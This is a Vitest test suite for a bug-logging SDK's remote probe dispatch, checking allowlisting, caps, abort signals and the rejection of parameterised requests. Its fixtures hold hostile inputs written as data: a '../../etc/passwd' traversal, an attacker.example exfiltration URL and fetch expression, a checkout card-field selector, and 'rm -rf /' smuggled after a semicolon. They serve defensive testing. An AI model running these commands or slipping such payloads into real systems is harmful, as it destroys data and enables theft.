import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import type { ProbeContext, ProbeName } from "../probes";
import type { BugEvent, CrumbtrailConfig } from "../types";

/**
 * Every call the config poll makes into the probe registry, with the context runProbe was handed
 * and the signal each context supplier was called with. Recorded by wrapping the real `runProbe`
 * rather than replacing it, so these tests exercise the shipped probe implementations.
 */
interface RecordedProbeCall {
  name: string;
  ctx: ProbeContext;
}

const probeCalls: RecordedProbeCall[] = [];
const stateSupplierCalls: Array<{ name: string; signal: AbortSignal }> = [];

vi.mock("../probes", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../probes")>();
  return {
    ...actual,
    runProbe: (name: string, ctx: ProbeContext = {}) => {
      probeCalls.push({ name, ctx });
      // Wrap `getState` so the signal runProbe threads into the host's supplier is observable.
      // This is the only way to prove the deadline signal reaches the SDK's own suppliers rather
      // than stopping at the registry boundary.
      const observed: ProbeContext = {
        ...ctx,
        getState: ctx.getState
          ? (stateName: string, signal: AbortSignal) => {
              stateSupplierCalls.push({ name: stateName, signal });
              return ctx.getState?.(stateName, signal);
            }
          : undefined,
      };
      return actual.runProbe(name, observed);
    },
  };
});

// Imported after vi.mock so the logger binds to the wrapped registry.
const { Crumbtrail } = await import("../bug-logger");
const { PROBE_RESULT_EVENT_KIND } = await import("../bug-logger");
const { PROBE_NAMES } = await import("../probes");

/** Collectors off: this suite asserts on exact event counts, so nothing else may emit. */
const COLLECTORS_OFF: Partial<CrumbtrailConfig> = {
  console: false,
  network: false,
  interactions: false,
  keystrokes: false,
  scroll: false,
  visibility: false,
  clipboard: false,
  cookies: false,
  storage: false,
  errors: false,
  performance: false,
  heartbeat: false,
  uiNumbers: false,
  listeners: false,
  eventSource: false,
  webSocket: false,
  workers: false,
  widget: false,
};

function makeTransport() {
  const sent: BugEvent[] = [];
  return {
    sent,
    sendEvents: vi.fn(async (events: BugEvent[]) => {
      sent.push(...events);
    }),
    sendBlob: vi.fn().mockResolvedValue(undefined),
    startSession: vi.fn().mockResolvedValue(undefined),
    endSession: vi.fn().mockResolvedValue(undefined),
    sendBugReport: vi.fn().mockResolvedValue(undefined),
  };
}

type Transport = ReturnType<typeof makeTransport>;

function startWithPollPayload(
  payload: unknown,
  extra: Partial<CrumbtrailConfig> = {},
): { logger: ReturnType<typeof Crumbtrail.init>; transport: Transport } {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockResolvedValue(new Response(JSON.stringify(payload))),
  );
  const transport = makeTransport();
  const logger = Crumbtrail.init({
    ...COLLECTORS_OFF,
    ...extra,
    transportInstance: transport,
    configEndpoint: "/api/capture-config",
    projectKey: "ctkey_test",
    configPollIntervalMs: 100_000,
    flushIntervalMs: 100_000,
    // Flush on every emit so an assertion never races the batch interval.
    flushBufferSize: 1,
  });
  return { logger, transport };
}

/** Let the poll's fetch, its json(), and the awaited probe run all settle. */
async function settle(): Promise<void> {
  for (let index = 0; index < 20; index += 1) {
    await new Promise((resolve) => setTimeout(resolve, 0));
  }
}

function probeResults(transport: Transport): BugEvent[] {
  return transport.sent.filter(
    (event) => event.k === PROBE_RESULT_EVENT_KIND,
  );
}

beforeEach(() => {
  probeCalls.length = 0;
  stateSupplierCalls.length = 0;
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe("probe dispatch from the config poll", () => {
  it("runs one probe and emits one result for a payload that only asks for probes", async () => {
    const { logger, transport } = startWithPollPayload({
      probes: ["storage.snapshot", "evil.exec", "../../etc/passwd"],
    });
    await settle();

    expect(probeCalls.map((call) => call.name)).toEqual(["storage.snapshot"]);

    const results = probeResults(transport);
    expect(results).toHaveLength(1);
    expect(results[0].d.name).toBe("storage.snapshot");
    expect(results[0].d.ok).toBe(true);
    expect(Array.isArray(results[0].d.rows)).toBe(true);

    await logger.stop();
  });

  it("caps a poll at four probes and runs each name once", async () => {
    // PROBE_NAMES holds exactly four names today, so the cap and the allowlist coincide. This
    // assertion is the tripwire: a fifth probe makes the cap the binding constraint and this test
    // must then feed five distinct names.
    expect(PROBE_NAMES).toHaveLength(4);

    const { logger, transport } = startWithPollPayload({
      probes: [
        ...PROBE_NAMES,
        ...PROBE_NAMES,
        "storage.snapshot",
        "not.a.probe",
        "runtime.env ",
        "RUNTIME.ENV",
      ],
    });
    await settle();

    expect(probeCalls).toHaveLength(4);
    expect(probeCalls.map((call) => call.name).sort()).toEqual(
      [...PROBE_NAMES].sort(),
    );
    expect(probeResults(transport)).toHaveLength(4);

    await logger.stop();
  });

  it("refuses a probes list long enough to be a denial of service rather than a request", async () => {
    const { logger, transport } = startWithPollPayload({
      probes: Array.from({ length: 65 }, () => "storage.snapshot"),
    });
    await settle();

    expect(probeCalls).toHaveLength(0);
    expect(probeResults(transport)).toHaveLength(0);

    await logger.stop();
  });

  it("reports network.inflight as unavailable rather than as an empty table", async () => {
    const { logger, transport } = startWithPollPayload({
      probes: ["network.inflight"],
    });
    await settle();

    const results = probeResults(transport);
    expect(results).toHaveLength(1);
    expect(results[0].d.ok).toBe(false);
    expect(results[0].d.error).toBe("unavailable");
    expect(results[0].d.rows).toEqual([]);

    await logger.stop();
  });

  it("answers network.inflight from the collector's registered live state", async () => {
    const { logger, transport } = startWithPollPayload({
      probes: ["network.inflight"],
    });
    logger.registerStateProvider("network.pending", () => [
      { method: "GET", url: "https://api.example.com/orders?token=abc", ageMs: 1200 },
    ]);
    await settle();

    const results = probeResults(transport);
    expect(results).toHaveLength(1);
    expect(results[0].d.ok).toBe(true);
    expect(results[0].d.rows).toHaveLength(1);

    await logger.stop();
  });

  it("does not run a probe once the kill switch is set", async () => {
    const { logger, transport } = startWithPollPayload({
      killSwitch: true,
      probes: ["storage.snapshot"],
    });
    await settle();

    expect(probeCalls).toHaveLength(0);
    expect(probeResults(transport)).toHaveLength(0);

    await logger.stop();
  });
});

describe("probe dispatch deadline signal", () => {
  it("hands the SDK's own state supplier the probe's live deadline signal", async () => {
    const { logger } = startWithPollPayload({ probes: ["network.inflight"] });
    logger.registerStateProvider("network.pending", () => []);
    await settle();

    expect(stateSupplierCalls).toHaveLength(1);
    const { name, signal } = stateSupplierCalls[0];
    expect(name).toBe("network.pending");
    expect(signal).toBeInstanceOf(AbortSignal);
    // Not aborted while the probe is still inside its deadline: this is a live signal, not a
    // placeholder handed over to satisfy a signature.
    expect(signal.aborted).toBe(false);

    await logger.stop();
  });

  it("refuses to read host state through an already aborted signal", async () => {
    const { logger } = startWithPollPayload({ probes: ["network.inflight"] });
    const provider = vi.fn(() => []);
    logger.registerStateProvider("network.pending", provider);
    await settle();

    expect(provider).toHaveBeenCalledTimes(1);

    // The context the logger builds is the object under test: replay it with an aborted signal
    // and the host application is not touched again.
    const ctx = probeCalls[0].ctx;
    const aborted = AbortSignal.abort();
    expect(ctx.getState?.("network.pending", aborted)).toBeUndefined();
    expect(ctx.getDeclaredEnv?.(aborted)).toBeUndefined();
    expect(provider).toHaveBeenCalledTimes(1);

    await logger.stop();
  });
});

describe("probe dispatch rejects a parameterised probe request", () => {
  it("rejects the whole probes field when one entry is an object", async () => {
    const { logger, transport } = startWithPollPayload({
      probes: [
        "storage.snapshot",
        {
          name: "runtime.env",
          selector: "#checkout input[name=card]",
          url: "https://attacker.example/exfil",
          path: "../../etc/passwd",
          expression: "fetch('https://attacker.example')",
        },
      ],
    });
    await settle();

    expect(probeCalls).toHaveLength(0);
    expect(probeResults(transport)).toHaveLength(0);

    await logger.stop();
  });

  it("never echoes injected content back into a captured event", async () => {
    const injected = "rm -rf /";
    // A payload that does get applied — one real probe runs — while every other field it carries
    // is attacker chosen. The event that rests must be the probe's own answer and nothing else.
    const { logger, transport } = startWithPollPayload({
      probes: [
        "storage.snapshot",
        `storage.snapshot; ${injected}`,
        `${injected}`,
      ],
      reason: injected,
      note: injected,
      raise: ["network", injected],
      signature: injected,
    });
    await settle();

    expect(probeCalls.map((call) => call.name)).toEqual(["storage.snapshot"]);
    expect(probeResults(transport)).toHaveLength(1);
    expect(JSON.stringify(transport.sent)).not.toContain(injected);
    expect(JSON.stringify(transport.sent)).not.toContain("rm");

    await logger.stop();
  });

  it("never passes a payload value into a probe as an argument", async () => {
    const { logger } = startWithPollPayload({
      probes: ["runtime.env"],
      probeArgs: { selector: "#secret" },
      timeoutMs: 999_999,
      maxRows: 10_000_000,
    });
    await settle();

    expect(probeCalls).toHaveLength(1);
    const ctx = probeCalls[0].ctx;
    // The context is built from this instance's own state. Nothing a response body carries —
    // not a selector, not a bound, not a clock — reaches it.
    expect(ctx.timeoutMs).toBeUndefined();
    expect(ctx.maxRows).toBeUndefined();
    expect(ctx.maxBytes).toBeUndefined();
    expect(Object.keys(ctx).sort()).toEqual(["getDeclaredEnv", "getState"]);

    await logger.stop();
  });
});
